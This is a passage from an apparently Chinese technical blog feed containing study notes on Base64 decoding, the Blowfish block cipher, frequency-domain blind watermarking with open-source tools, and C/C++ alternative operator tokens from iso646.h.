<span class="number">64</span>, <span class="number">63</span>,</span><br><span class="line">		<span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">		<span class="number">64</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>,</span><br><span class="line">		<span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">		<span class="number">64</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>,</span><br><span class="line">		<span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="function"><span class="type">static</span> string <span class="title">bad</span><span class="params">(<span class="string">&quot;decode bad!&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果长度不是 4 的倍数，则返回 bad 字符串</span></span><br><span class="line">	<span class="keyword">if</span> ((code.<span class="built_in">size</span>() &amp; <span class="number">0x3</span>) != <span class="number">0</span>) <span class="keyword">return</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 计算解密字符</span></span><br><span class="line">	<span class="type">size_t</span> count = code.<span class="built_in">size</span>() / <span class="number">4</span>;</span><br><span class="line">	<span class="function">string <span class="title">result</span><span class="params">(count * <span class="number">3</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">	<span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> h, l;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (i != count)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 以 4 bytes 为一组进行解密</span></span><br><span class="line">		<span class="comment">// 取映射表对应数 (每个数作 6 bit 计算)</span></span><br><span class="line">		h = table[code[i * <span class="number">4</span>]];</span><br><span class="line">		l = table[code[i * <span class="number">4</span> + <span class="number">1</span>]];</span><br><span class="line">		<span class="comment">// 若一组中前两个字符不在 base64 加密字符范围，则返回 bad 字符串</span></span><br><span class="line">		<span class="keyword">if</span> (h == <span class="number">64</span> || l == <span class="number">64</span>) <span class="keyword">return</span> bad;</span><br><span class="line">		<span class="comment">// 将第一个数的前 4 bit 与第二个数的前 4 bit 组合</span></span><br><span class="line">		result[i * <span class="number">3</span>] = (h &lt;&lt; <span class="number">2</span>) | (l &gt;&gt; <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 取映射表对应数</span></span><br><span class="line">		h = table[code[i * <span class="number">4</span> + <span class="number">2</span>]];</span><br><span class="line">		<span class="comment">// 若一组中第三个数不在 base64 加密字符范围，则说明为 &#x27;=&#x27;，即解密结束 (严格来说需判断是否为&#x27;=&#x27;)</span></span><br><span class="line">		<span class="keyword">if</span> (h != <span class="number">64</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 将第二个数的前 2 bit 与第三个数的前 4 bit 组合</span></span><br><span class="line">			result[i * <span class="number">3</span> + <span class="number">1</span>] = (l &lt;&lt; <span class="number">4</span>) | (h &gt;&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 取映射表对应数</span></span><br><span class="line">			l = table[code[i * <span class="number">4</span> + <span class="number">3</span>]];</span><br><span class="line">			<span class="keyword">if</span> (l != <span class="number">64</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 将第三个数的前 2 bit 与第二个数的 6 bit 组合</span></span><br><span class="line">				result[i * <span class="number">3</span> + <span class="number">2</span>] = (h &lt;&lt; <span class="number">6</span>) | l;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 迭代至下三个数 (每个数作 6 bit 计算)</span></span><br><span class="line">		++i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="python-实现">Python 实现</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># encode</span></span><br><span class="line">base64.b64encode(<span class="string">&quot;Duzou&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line">base64.b64decode(<span class="string">&quot;RHV6b3VfMXNfczBfaDRuZHNPbWU=&quot;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="bash">bash</h1>
<h2 id="加密---encode-1">加密 - Encode</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Duzou | <span class="built_in">base64</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意，bash 的 echo 会默认加一个回车在末尾</p>
</blockquote>
<h2 id="解密---decode-1">解密 - Decode</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> RHV6b3VfMXNfczBfaDRuZHNPbWU= | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>
<h1 id="在线网站">在线网站</h1>
<ul>
<li>https://www.qqxiuzi.cn/bianma/base64.htm</li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title>BlowFish 算法笔记</title>
    <url>//blowfish-note.html</url>
    <content><![CDATA[<h1 id="blowfish-简述">BlowFish 简述</h1>
<p>BlowFish 算法基于 Feistel 网络，加密函数迭代执行 16 轮，分组长度为 64
位，密钥长度可以从 32 位到 448
位。算法由两部分组成，密钥扩展部分和数据加密部分，密钥扩展部分将最长最长为
448 位的密钥转化成共 4168 字节长度的子密钥数组，其中，数据加密由一个 16
轮的 Feistel
网络完成，每轮由一个密钥相关置换和一个密钥与数据相关的替换组成。</p>
<figure>
<img src="/blowfish-note/blowfish%20流程图.png" alt="blowfish 流程图">
<figcaption aria-hidden="true">blowfish 流程图</figcaption>
</figure>
<h1 id="blowfish-描述">BlowFish 描述</h1>
<h2 id="密钥预处理">密钥预处理</h2>
<p>BlowFish 算法子密钥在加密前预计算产生。</p>
<p>主要涉及到 P-box 和 S-box。</p>
<h3 id="密钥-key">密钥 Key</h3>
<p>密钥 Key 是 32bits 到 448bits 的可变长度，即 1 到 14 个
<code>DWORD</code> 数字，即 Key 数组最大为
<code>DWORD Key[14]</code>。</p>
<p>接下来使用 <code>Key[i]</code> 表示第 <code>i</code> 个可变密钥。</p>
<h3 id="p-box">P-box</h3>
<p>P-box 也可以被称作密钥数组，由 18 个 32bits 的密钥组成，即数组
<code>DWORD P_box[18]</code></p>
<p>我们首先要使用随机数对数组进行初始化，而常用的方法是使用常量 <span class="math inline">\(\pi\)</span> 的小数部分，将其直接转化为 32bits 位
<code>DWORD</code> 数进行赋值，如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">P_box[<span class="number">0</span>] = <span class="number">0x76a301d3</span>;</span><br><span class="line">P_box[<span class="number">1</span>] = <span class="number">0xbc452aef</span>;</span><br><span class="line">...</span><br><span class="line">P_box[<span class="number">17</span>] = <span class="number">0xd7acc4a5</span>;</span><br></pre></td></tr></table></figure>
<p>之后让 P-box 与 Key 数组的每一个值进行异或，即
<code>P_box[i] ^= Key[i]</code>。</p>
<p>当超过 Key 数组的长度时，则重复使用 Key 的值进行异或，直到 P-box
中的元素全部异或完成。</p>
<p>如此我们便得到了新的 P-box。</p>
<h3 id="s-box">S-box</h3>
<p>在密码学中，S-box 的全称为
substitution-box，即替换盒子，可以将输入替换成不同的输出，换句话说，可以将
n bits 的输入转换为 m bits 的输出。</p>
<p>在 BlowFish 中，S-box 是动态生成的，负责将 8bits 的输入转换为 32bits
的输出。</p>
<p>故 S-box 的大小为 <code>DWORD S_box[4][256]</code>。</p>
<p>常用的方法是，使用常量 <span class="math inline">\(\pi\)</span>
的小数部分，将其直接转化为 32bits 位 <code>DWORD</code> 数对 S-box
进行初始化，通常接在 P-box 后面进行初始化。</p>
<h3 id="最终处理">最终处理</h3>
<p>通过以上，得到初始化的 P-box 与 S-box。</p>
<p>按照以下步骤对 P-box 进行处理：</p>
<ol type="1">
<li>取全为 0 的 64bits，使用 P-box 和 S-box 数组，对其进行 BlowFish
加密，生成第一个 64bits</li>
<li>将生成的 64bits 作为新的 <code>P_box[0]</code> 和
<code>P_box[1]</code>，再将这 64bits 作为输入，得到新的
<code>P_box[2]</code> 和 <code>P_box[3]</code></li>
<li>同理反复步骤 2，最终生成所有 P-box 数组的元素。</li>
<li>同理反复步骤 2、3，最终生成所有 S-box 数组的元素 (使用
<code>P-box[16]</code> 和 <code>P-box[17]</code> 作为输入)。</li>
</ol>
<h2 id="加解密">加解密</h2>
<p>BlowFish 由 16 轮的 Fistel 网络组成，输入是一个 64bits 的数据元素
X，将 X 分为两个 32bits 部分，为 XL 与 XH。</p>
<h3 id="轮函数">轮函数</h3>
<p>轮函数使用代码描述即为</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 轮函数</span></span><br><span class="line"><span class="function">DWORD <span class="title">Feistel</span><span class="params">(DWORD x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD h = S[<span class="number">0</span>][x &gt;&gt; <span class="number">24</span>] + S[<span class="number">1</span>][x &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>];</span><br><span class="line">	<span class="keyword">return</span> (h ^ S[<span class="number">2</span>][x &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>]) + S[<span class="number">3</span>][x &amp; <span class="number">0xff</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="加密算法">加密算法</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(DWORD&amp; XL, DWORD&amp; XR)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		XL ^= P[i];</span><br><span class="line">		XR ^= <span class="built_in">Feistel</span>(XL);</span><br><span class="line">		XR ^= P[i + <span class="number">1</span>];</span><br><span class="line">		XL ^= <span class="built_in">Feistel</span>(XR);</span><br><span class="line">	&#125;</span><br><span class="line">	XL ^= P[<span class="number">16</span>];</span><br><span class="line">	XR ^= P[<span class="number">17</span>];</span><br><span class="line">	<span class="built_in">swap</span>(XL, XR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解密算法">解密算法</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(DWORD&amp; XL, DWORD&amp; XR)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">16</span>; i &gt; <span class="number">0</span>; i -= <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		XL ^= P[i + <span class="number">1</span>];</span><br><span class="line">		XR ^= <span class="built_in">Feistel</span>(XL);</span><br><span class="line">		XR ^= P[i];</span><br><span class="line">		XL ^= <span class="built_in">Feistel</span>(XR);</span><br><span class="line">	&#125;</span><br><span class="line">	XL ^= P[<span class="number">1</span>];</span><br><span class="line">	XR ^= P[<span class="number">0</span>];</span><br><span class="line">	<span class="built_in">swap</span>(XL, XR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="blowfish-c-实现">BlowFish &amp; C++ 实现</h1>
<p>请查看 <a href="https://github.com/HasegawaAzusa/BlowFish">https://github.com/HasegawaAzusa/BlowFish</a></p>
<p>代码堪堪能运行而已，仅作示例和理解。</p>
<h1 id="blowfish-优劣">BlowFish 优劣</h1>
<h2 id="优点">优点</h2>
<p>从上面的流程可以看出，blowfish在生成最终的K数组和S-box需要耗费一定的时间，但是一旦生成完毕，或者说密钥不变的情况下，blowfish还是很快速的一种分组加密方法。</p>
<p>每个新的密钥都需要进行大概4
KB文本的预处理，和其他分组密码算法相比，这个会很慢。</p>
<p>那么慢有没有好处呢？</p>
<p>当然有，因为对于一个正常应用来说，是不会经常更换密钥的。所以预处理只会生成一次。在后面使用的时候就会很快了。</p>
<p>而对于恶意攻击者来说，每次尝试新的密钥都需要进行漫长的预处理，所以对攻击者来说要破解blowfish算法是非常不划算的。所以blowfish是可以抵御字典攻击的。</p>
<h2 id="缺点">缺点</h2>
<p>Blowfish使用64位块大小（与AES的128位块大小相比）使它容易受到生日攻击，特别是在HTTPS这样的环境中。
2016年，SWEET32攻击演示了如何利用生日攻击对64位块大小的密码执行纯文本恢复（即解密密文）。</p>
<p>因为blowfish的块只有64bits，比较小，所以GnuPG项目建议不要使用Blowfish来加密大于4
GB的文件。</p>
<p>除此之外，Blowfish如果只进行一轮加密的话，容易受到反射性弱键的已知明文攻击。
但是我们的实现中使用的是16轮加密，所以不容易受到这种攻击。但是Blowfish的发明人布鲁斯·施耐尔（Bruce
Schneier）还是建议大家迁移到Blowfish的继承者Twofish去。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>盲水印笔记</title>
    <url>//blind-water-mark-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>水印（Water-Mark）是一种保护数字产品版权、完整性、防复制或去向追踪的技术，通常作为署名的一种。但水印的缺点显而易见，不止
PhotoShop 有去除水印的功能，同时可以使用截图等手段将水印抹除。</p>
<p>于是盲水印（Blind-Water-Mask）被发明出来，即字面意思——一种没办法用肉眼直接观察的水印。</p>
<p>盲水印有着隐蔽性（Imperceptible）、不易移除性（Non-removable）、强健性（Robustness）和明确性（Unambiguous），可以很好的满足当前数字版权保护的所需。</p>
<h1 id="频域隐写技术">频域隐写技术</h1>
<h2 id="原理">原理</h2>
<p>盲水印流程图如下：</p>
<figure>
<img src="/blind-water-mark-note/image-20220725205419764.png" alt="image-20220725205419764">
<figcaption aria-hidden="true">image-20220725205419764</figcaption>
</figure>
<h3 id="傅里叶变换">傅里叶变换</h3>
<p>盲水印用到的傅里叶变换是将信号在<strong>时域</strong>或<strong>空域</strong>的函数转变为用<strong>频域</strong>表示。</p>
<p>图像是二维离散的，对该二维信号在各个方向上进行一次一维的傅里叶变换即可得到二维频域图（使用的是离散傅里叶变换
DFT 算法），其中二维信号为时域中图像的灰度 <span class="math inline">\(f(u,v)\)</span>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接读取为灰度图</span></span><br><span class="line">img = cv2.imread(<span class="string">&#x27;./lena.jpeg&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 进行快速傅里叶变换</span></span><br><span class="line">f = np.fft.fft2(img)</span><br><span class="line"><span class="comment"># 取绝对值，将复数域映射到实数域</span></span><br><span class="line">s = np.log(np.<span class="built_in">abs</span>(f))</span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s)</span><br></pre></td></tr></table></figure>
<p>我们可以发现灰度信号被转化为了频域信号。</p>
<figure>
<img src="/blind-water-mark-note/对图像进行离散傅里叶变换.png" alt="对图像进行离散傅里叶变换">
<figcaption aria-hidden="true">对图像进行离散傅里叶变换</figcaption>
</figure>
<p>如果我们将图片的低频部分移动到中间，将高频部分移动到外围：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将图像中的低频部分移动到图像的中心</span></span><br><span class="line">fshift = np.fft.fftshift(f)</span><br><span class="line"><span class="comment"># 取绝对值，将复数域映射到实数域</span></span><br><span class="line">s = np.log(np.<span class="built_in">abs</span>(fshift))</span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s)</span><br></pre></td></tr></table></figure>
<figure>
<img src="/blind-water-mark-note/对DFT结果进行fftshift.png" alt="对DFT结果进行fftshift">
<figcaption aria-hidden="true">对DFT结果进行fftshift</figcaption>
</figure>
<p>同样的逆变换就是做相反的操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 逆变换</span></span><br><span class="line">ifshift = np.fft.ifftshift(fshift)</span><br><span class="line">iimg = np.fft.ifft2(ifshift)</span><br><span class="line"><span class="comment"># 取绝对值，将复数域映射到实数域</span></span><br><span class="line">s = np.<span class="built_in">abs</span>(iimg)</span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s)</span><br></pre></td></tr></table></figure>
<p>我们可以发现完美地还原了图片。</p>
<figure>
<img src="/blind-water-mark-note/DFT和IDFT的结果.png" alt="DFT和IDFT的结果">
<figcaption aria-hidden="true">DFT和IDFT的结果</figcaption>
</figure>
<p>那么根据这个原理，我们在变换和逆变换的中间，加入水印图像即可。</p>
<figure>
<img src="/blind-water-mark-note/加入了水印后的DFT.png" alt="加入了水印后的DFT">
<figcaption aria-hidden="true">加入了水印后的DFT</figcaption>
</figure>
<h3 id="水印对称性">水印对称性</h3>
<p>由于傅里叶变换后，频域图 <span class="math inline">\(f(u, v)\)</span>
与 <span class="math inline">\(f(-u,-v)\)</span>
是共轭的，所以其实部应该相等（如果不相等的话，逆变换后结果将在虚部上损失一部分信息，因为我们只写入实部数据），故我们应使得水印编码后的数据是对称的。</p>
<h1 id="工具">工具</h1>
<h2 id="blindwatermark">BlindWaterMark</h2>
<p>在盲水印的加密和解密中，我们通常使用 GitHub 上的开源脚本 <a href="https://github.com/chishaxie/BlindWaterMark">BlindWaterMark</a></p>
<p>需要注意的是，该项目需要原图才能提取盲水印。</p>
<ul>
<li><code>bwm.py</code> 程序文件python2版本</li>
<li><code>bwmforpy3.py</code> 程序文件python3版本</li>
<li><code>hui.png</code> 无水印的原图</li>
<li><code>wm.png</code> 水印图</li>
<li><code>hui_with_wm.png</code> 有盲水印的图</li>
<li><code>wm_from_hui.png</code> 解出来的水印图</li>
</ul>
<p>加密语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python bwm.py encode hui.png wm.png hui_with_wm.png</span><br></pre></td></tr></table></figure>
<p>解密语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png</span><br></pre></td></tr></table></figure>
<p>缺陷是该工具需要一张原图，且注意python2和python3版本程序的 encode 和
decode 结果会有所不同。主要原因是 python2 和 python3
的随机算法不同。如果想让 python3 兼容 python2 的随机算法，请添加
<code>--oldseed</code> 参数。</p>
<p>同时由于其水印编码方式是使用默认随机数的，如果需要指定随机数，需要使用
<code>--seed</code> 参数。</p>
<h2 id="blind_watermark">blind_watermark</h2>
<p>该项目的优点是无需原图即可还原盲水印，同时支持文字水印等。</p>
<p>该项目在 GitHub
上开源，主页链接：https://github.com/guofei9987/blind_watermark</p>
<p>安装方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install blind-watermark</span><br></pre></td></tr></table></figure>
<h3 id="在-bash-中使用">在 bash 中使用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># embed watermark into image:</span></span><br><span class="line">blind_watermark --embed --<span class="built_in">pwd</span> 1234 examples/pic/ori_img.jpeg <span class="string">&quot;watermark text&quot;</span> examples/output/embedded.png</span><br><span class="line"><span class="comment"># extract watermark from image:</span></span><br><span class="line">blind_watermark --extract --<span class="built_in">pwd</span> 1234 --wm_shape 111 examples/output/embedded.png</span><br></pre></td></tr></table></figure>
<h3 id="在-python-中使用">在 Python 中使用</h3>
<h4 id="嵌入文字">嵌入文字</h4>
<p>嵌入水印：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> blind_watermark <span class="keyword">import</span> WaterMark</span><br><span class="line"></span><br><span class="line">bwm1 = WaterMark(password_img=<span class="number">1</span>, password_wm=<span class="number">1</span>)</span><br><span class="line">bwm1.read_img(<span class="string">&#x27;pic/ori_img.jpg&#x27;</span>)</span><br><span class="line">wm = <span class="string">&#x27;@guofei9987 开源万岁！&#x27;</span></span><br><span class="line">bwm1.read_wm(wm, mode=<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">bwm1.embed(<span class="string">&#x27;output/embedded.png&#x27;</span>)</span><br><span class="line">len_wm = <span class="built_in">len</span>(bwm1.wm_bit)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Put down the length of wm_bit &#123;len_wm&#125;&#x27;</span>.<span class="built_in">format</span>(len_wm=len_wm))</span><br></pre></td></tr></table></figure>
<p>提取水印：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bwm1 = WaterMark(password_img=<span class="number">1</span>, password_wm=<span class="number">1</span>)</span><br><span class="line">wm_extract = bwm1.extract(<span class="string">&#x27;output/embedded.png&#x27;</span>, wm_shape=len_wm, mode=<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(wm_extract)</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<blockquote>
<p><span class="citation" data-cites="guofei9987">@guofei9987</span>
开源万岁！</p>
</blockquote>
<h4 id="嵌入图像">嵌入图像</h4>
<p>嵌入水印：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> blind_watermark <span class="keyword">import</span> WaterMark</span><br><span class="line"></span><br><span class="line">bwm1 = WaterMark(password_wm=<span class="number">1</span>, password_img=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># read original image</span></span><br><span class="line">bwm1.read_img(<span class="string">&#x27;pic/ori_img.jpg&#x27;</span>)</span><br><span class="line"><span class="comment"># read watermark</span></span><br><span class="line">bwm1.read_wm(<span class="string">&#x27;pic/watermark.png&#x27;</span>)</span><br><span class="line"><span class="comment"># embed</span></span><br><span class="line">bwm1.embed(<span class="string">&#x27;output/embedded.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>提取水印：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bwm1 = WaterMark(password_wm=<span class="number">1</span>, password_img=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># notice that wm_shape is necessary</span></span><br><span class="line">bwm1.extract(filename=<span class="string">&#x27;output/embedded.png&#x27;</span>, wm_shape=(<span class="number">128</span>, <span class="number">128</span>), out_wm_name=<span class="string">&#x27;output/extracted.png&#x27;</span>, )</span><br></pre></td></tr></table></figure>
<h4 id="嵌入位数组">嵌入位数组</h4>
<p>作为演示，我们嵌入了 6 个字节的数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wm = [<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">False</span>]</span><br></pre></td></tr></table></figure>
<p>嵌入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> blind_watermark <span class="keyword">import</span> WaterMark</span><br><span class="line"></span><br><span class="line">bwm1 = WaterMark(password_img=<span class="number">1</span>, password_wm=<span class="number">1</span>)</span><br><span class="line">bwm1.read_ori_img(<span class="string">&#x27;pic/ori_img.jpg&#x27;</span>)</span><br><span class="line">bwm1.read_wm([<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">False</span>], mode=<span class="string">&#x27;bit&#x27;</span>)</span><br><span class="line">bwm1.embed(<span class="string">&#x27;output/embedded.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>提炼：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bwm1 = WaterMark(password_img=<span class="number">1</span>, password_wm=<span class="number">1</span>, wm_shape=<span class="number">6</span>)</span><br><span class="line">wm_extract = bwm1.extract(<span class="string">&#x27;output/打上水印的图.png&#x27;</span>, mode=<span class="string">&#x27;bit&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(wm_extract)</span><br></pre></td></tr></table></figure>
<p>注意<code>wm_shape</code>（水印的形状）是必要的</p>
<p>输出<code>wm_extract</code>是一个浮点数组。设置一个阈值，例如
0.5。</p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>forensics</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言和C++运算符保留字笔记</title>
    <url>//c-reserved-word-note.html</url>
    <content><![CDATA[<h1 id="c替代标记">C替代标记</h1>
<h2 id="简述">简述</h2>
<p>C替代标记指一批C语言常见运算符的可选拼写。它们实现为C标准库中iso646.h头文件内的一组宏定义。此标记作为C90标准的修正案于1995年增补。</p>
<p>替代标记允许程序员使用C语言按位和逻辑运算符，原因是原先的标记在一些国际和非QWERTY键盘上很难输入。</p>
<blockquote>
<p><del>个人而言使用这些替代标记让我在 python 和 C++
的切换中更加顺畅</del></p>
</blockquote>
<h2 id="c语言">C语言</h2>
<p>在<code>iso646.h</code>中定义了11个宏：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">宏</th>
<th style="text-align: center;">定义为</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>and</code></td>
<td style="text-align: center;"><code>&amp;&amp;</code></td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>and_eq</code></td>
<td style="text-align: center;"><code>&amp;=</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>bitand</code></td>
<td style="text-align: center;"><code>&amp;</code></td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>bitor</code></td>
<td style="text-align: center;"><code>|</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>compl</code></td>
<td style="text-align: center;"><code>~</code></td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>not</code></td>
<td style="text-align: center;"><code>!</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>not_eq</code></td>
<td style="text-align: center;"><code>!=</code></td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>or</code></td>
<td style="text-align: center;"><code>||</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>or_eq</code></td>
<td style="text-align: center;"><code>|=</code></td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>xor</code></td>
<td style="text-align: center;"><code>^</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>xor_eq</code></td>
<td style="text-align: center;"><code>^=</code></td>
</tr>
</tbody>
</table>
<p>在C语言中只需要包含头文件，即可使用这些关键字。</p>
<p>示例程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iso646.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> a = (<span class="number">10086</span>) and (<span class="number">1024</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="c">C++</h2>
<p>在C++中，以上都为运算符关键字，无需包含头文件便可编译。</p>
<p>为了兼容C语言，C++98标准提供了头文件<code>&lt;ciso646&gt;</code>，但实际上这是个空文件。</p>
<p>实例程序：</p>
